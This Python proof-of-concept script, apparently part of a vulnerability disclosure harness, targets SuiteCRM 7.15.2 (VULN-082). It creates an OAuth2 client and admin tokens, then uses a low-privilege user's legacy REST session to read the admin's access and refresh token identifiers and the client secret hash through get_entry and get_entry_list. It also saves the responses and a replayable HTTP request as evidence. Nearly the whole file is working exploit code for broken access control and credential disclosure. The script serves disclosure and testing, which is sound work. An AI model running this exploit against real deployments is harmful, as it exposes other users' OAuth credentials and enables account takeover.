#!/usr/bin/env python3
"""
VULN-082 -- Legacy web service leaks OAuth token & client-secret material
            (`api-visible` != `sensitive` gap).

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : read gate service/core/SoapHelperWebService.php:420-422 (modInvisList modules,
             including OAuth2Tokens/OAuth2Clients, forced to 'read_only' for EVERY caller);
             serializer include/utils.php:5757-5771 clean_sensitive_data() only blanks fields
             flagged 'sensitive', never 'api-visible'=false (which is what OAuth2Tokens.access_token/
             refresh_token/state and OAuth2Clients.secret are actually flagged with).

Plan
----
1. As admin, create a real OAuth2Clients record (password grant) -- the client `secret` column
   is a sha256 hex digest, computed client-side here (mirrors what the admin-UI save hook does
   for OAuth2Clients::save() when $_REQUEST['new_secret'] is set -- we just do the hashing
   ourselves so this works over the plain legacy set_entry API).
2. Mint a REAL V8 OAuth2 access_token + refresh_token for the ADMIN user via the password grant
   at /Api/access_token, using that client. This plants genuine, unpredictable secret strings in
   the live `oauth2tokens` table -- not fabricated data.
3. Create an ordinary low-privilege user (no special ACL/Role needed -- the modInvis 'read_only'
   override applies unconditionally to every caller, which is itself part of the finding).
4. As that low-priv user (their own, unrelated legacy REST session), call get_entry_list on
   OAuth2Tokens and OAuth2Clients and show the EXACT plaintext access_token/refresh_token and the
   client secret hash are returned unredacted -- byte-for-byte equal to the values minted/set in
   steps 1-2, proving genuine secret-material disclosure, not merely "some field came back".
"""
import base64
import hashlib
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, create_user, rest_login, rest_call, BROWSER_UA)
from _c1_common import db_rows


def jwt_claim(jwt_str, claim):
    """Decode a JWT's payload (no signature verification -- we only need the claims,
    and verifying isn't the point of this test) and return one claim. League's
    AccessTokenEntityTrait::convertToJWT() sets 'jti' to the token *identifier*, which
    is what actually gets persisted verbatim into oauth2tokens.access_token (the DB
    does NOT store the full signed JWT -- see AccessTokenRepository::persistNewAccessToken)."""
    parts = jwt_str.split(".")
    if len(parts) != 3:
        return None
    payload = parts[1]
    payload += "=" * (-len(payload) % 4)
    data = json.loads(base64.urlsafe_b64decode(payload))
    return data.get(claim)

import requests

VULN_ID = "VULN-082"
HERE = os.path.dirname(os.path.abspath(__file__))


def entry_list_field(rest_data_result, field):
    """Pull field -> value out of a get_entry_list() entry_list[0]['name_value_list']."""
    entries = rest_data_result.get("entry_list") or []
    if not entries:
        return None, rest_data_result
    nvl = entries[0].get("name_value_list", {})
    v = nvl.get(field)
    return (v.get("value") if isinstance(v, dict) else v), entries[0]


def main():
    banner(VULN_ID, "legacy web service leaks OAuth token/secret material to any authenticated user")

    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)

    log("SETUP", "create a real OAuth2Clients record (password grant)")
    client_name = f"Stage10-VULN-082-{rand('cli')}"
    plaintext_secret = rand("clientsecret")
    secret_hash = hashlib.sha256(plaintext_secret.encode()).hexdigest()
    res = rest_call("set_entry", [admin_sid, "OAuth2Clients", [
        {"name": "name", "value": client_name},
        {"name": "secret", "value": secret_hash},
        {"name": "allowed_grant_type", "value": "password"},
        {"name": "is_confidential", "value": "1"},
    ]])
    client_id = res.get("id")
    if not client_id or client_id == "-1":
        verdict(VULN_ID, "FAILED", f"could not create OAuth2Clients record: {res}")
        sys.exit(1)
    log("OK", f"OAuth2Client id={client_id} name={client_name!r} secret(sha256)={secret_hash}")

    log("SETUP", "mint a REAL V8 OAuth2 access_token+refresh_token for admin via password grant")
    r_tok = requests.post(f"{BASE_URL}/Api/access_token", data={
        "grant_type": "password",
        "client_id": client_id,
        "client_secret": plaintext_secret,
        "username": ADMIN_USER,
        "password": ADMIN_PASS,
    }, headers={"User-Agent": BROWSER_UA}, timeout=30)
    try:
        tok = r_tok.json()
    except Exception as e:  # noqa: BLE001
        verdict(VULN_ID, "FAILED", f"/Api/access_token did not return JSON: {e} / {r_tok.text[:300]!r}")
        sys.exit(1)
    minted_access_token = tok.get("access_token")
    minted_refresh_token = tok.get("refresh_token")
    if not minted_access_token or not minted_refresh_token:
        verdict(VULN_ID, "FAILED", f"/Api/access_token did not mint a real token pair: {tok}")
        sys.exit(1)
    log("OK", f"minted access_token(JWT)={minted_access_token[:40]}... "
              f"refresh_token(encrypted)={minted_refresh_token[:40]}...")
    with open(os.path.join(HERE, "evidence", "minted_v8_token_response.json"), "w") as f:
        json.dump(tok, f, indent=2)

    # The client-visible access_token is a signed JWT and the refresh_token is a Defuse-encrypted
    # blob -- NEITHER is what's stored verbatim in oauth2tokens (see AccessTokenRepository::
    # persistNewAccessToken / RefreshTokenRepository::persistNewRefreshToken: both store only the
    # League *identifier*, e.g. $accessTokenEntity->getIdentifier()). Decode the JWT's `jti` claim
    # (the identifier League embeds) purely to show the correlation, then use the DB row itself
    # (admin-verified ground truth, same pattern as VULN-001/003) as the expected values.
    jti = jwt_claim(minted_access_token, "jti")
    log("INFO", f"JWT 'jti' claim (League's internal access-token identifier) = {jti!r}")

    admin_lookup = db_rows(f"SELECT id, access_token, refresh_token, assigned_user_id, client "
                            f"FROM oauth2tokens WHERE access_token='{jti}';") if jti else []
    if not admin_lookup:
        verdict(VULN_ID, "FAILED", f"could not locate the minted token's row in oauth2tokens via jti={jti!r}")
        sys.exit(1)
    token_row_id = admin_lookup[0]["id"]
    expected_access_token = admin_lookup[0]["access_token"]
    expected_refresh_token = admin_lookup[0]["refresh_token"]
    log("INFO", f"(admin/db ground truth, orientation only) oauth2tokens row id={token_row_id} "
                f"access_token={expected_access_token!r} refresh_token={expected_refresh_token!r} "
                f"assigned_user_id={admin_lookup[0]['assigned_user_id']!r}")
    if expected_access_token != jti:
        log("INFO", "NOTE: stored access_token differs from the JWT's jti claim -- unexpected, recording anyway.")

    log("SETUP", "create an ORDINARY low-privilege user -- no special ACL/Role needed for this finding")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"low-priv user: {low['user_name']} id={low['id']}")
    low_sid = rest_login(low["user_name"], low["password"])

    # --- The vulnerable reads: OAuth2Tokens + OAuth2Clients via a low-priv session ------
    log("STEP", "low-priv get_entry_list(OAuth2Tokens) requesting access_token/refresh_token/state/assigned_user_id")
    r1 = rest_call("get_entry_list", [
        low_sid, "OAuth2Tokens", "", "date_entered DESC", 0,
        ["id", "access_token", "refresh_token", "assigned_user_id", "state", "client"],
        [], 20, False, False,
    ])
    with open(os.path.join(HERE, "evidence", "low_priv_oauth2tokens_response.json"), "w") as f:
        json.dump(r1, f, indent=2)
    log("INFO", f"get_entry_list(OAuth2Tokens) returned {len(r1.get('entry_list') or [])} row(s) -- "
                f"OAuth2Tokens.get_list() row-scopes to the CALLER's own assigned_user_id (an "
                f"application-level 'my tokens' filter, unrelated to ACL), so a listing call alone "
                f"does not surface another user's row. Falling back to a direct by-id read "
                f"(get_entry), the same primitive VULN-001 uses, which does NOT row-scope.")

    log("STEP", f"low-priv get_entry(OAuth2Tokens, id={token_row_id}) -- direct by-id BOLA read, "
                "no listing/row-scope involved, mirrors VULN-001's retrieve-by-id pattern")
    r1b = rest_call("get_entry", [low_sid, "OAuth2Tokens", token_row_id,
                                   ["id", "access_token", "refresh_token", "assigned_user_id", "state", "client"], []])
    with open(os.path.join(HERE, "evidence", "low_priv_oauth2tokens_get_entry_response.json"), "w") as f:
        json.dump(r1b, f, indent=2)

    found_row = None
    for entry in (r1b.get("entry_list") or []):
        nvl = entry.get("name_value_list", {})
        found_row = {k: (v.get("value") if isinstance(v, dict) else v) for k, v in nvl.items()}
        break

    log("INFO", f"get_entry(OAuth2Tokens) response: {r1b}")
    if found_row:
        log("PROOF", f"leaked row: access_token={found_row.get('access_token')!r} "
                     f"refresh_token={found_row.get('refresh_token')!r} "
                     f"assigned_user_id={found_row.get('assigned_user_id')!r} "
                     f"client={found_row.get('client')!r}")

    tokens_leaked = bool(found_row) and found_row.get("access_token") == expected_access_token \
        and found_row.get("refresh_token") == expected_refresh_token \
        and found_row.get("access_token") == jti

    log("STEP", "low-priv get_entry_list(OAuth2Clients) requesting secret")
    r2 = rest_call("get_entry_list", [
        low_sid, "OAuth2Clients", "", "date_entered DESC", 0,
        ["id", "secret", "name", "allowed_grant_type"], [], 20, False, False,
    ])
    with open(os.path.join(HERE, "evidence", "low_priv_oauth2clients_response.json"), "w") as f:
        json.dump(r2, f, indent=2)

    client_row = None
    for entry in (r2.get("entry_list") or []):
        if entry.get("id") == client_id:
            nvl = entry.get("name_value_list", {})
            client_row = {k: (v.get("value") if isinstance(v, dict) else v) for k, v in nvl.items()}
            break

    log("INFO", f"low-priv get_entry_list(OAuth2Clients) returned {len(r2.get('entry_list') or [])} row(s); "
                f"{'FOUND our client row' if client_row else 'did NOT find our client row'}")
    if client_row:
        log("PROOF", f"leaked client row: secret={client_row.get('secret')!r} "
                     f"(expected sha256 = {secret_hash!r})")

    secret_leaked = bool(client_row) and client_row.get("secret") == secret_hash

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\n"
            f"Host: {BASE_URL.split('//', 1)[1]}\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            "method=get_entry&input_type=JSON&response_type=JSON&rest_data="
            f'["{low_sid}","OAuth2Tokens","{token_row_id}",'
            '["id","access_token","refresh_token","assigned_user_id","state","client"],[]]\n'
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(json.dumps(r1b, indent=2))

    ok = tokens_leaked and secret_leaked
    if not ok:
        reasons = []
        if not tokens_leaked:
            reasons.append("OAuth2Tokens access_token/refresh_token were not returned unredacted to the low-priv session")
        if not secret_leaked:
            reasons.append("OAuth2Clients secret was not returned unredacted to the low-priv session")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", "Confirmed: a completely unrelated low-privilege user reads another user's (admin's) live "
              "OAuth2 access_token+refresh_token identifiers AND the OAuth2Client's secret hash, "
              "unredacted, via the legacy get_entry/get_entry_list API.")
    verdict(VULN_ID, "CONFIRMED",
            f"low-priv user (no special ACL) read admin's OAuth2Tokens row: access_token="
            f"{expected_access_token[:24]}... refresh_token={expected_refresh_token[:24]}... "
            f"(exact match to DB-verified minted values); OAuth2Clients.secret={secret_hash[:24]}... (exact match)")
    sys.exit(0)


if __name__ == "__main__":
    main()
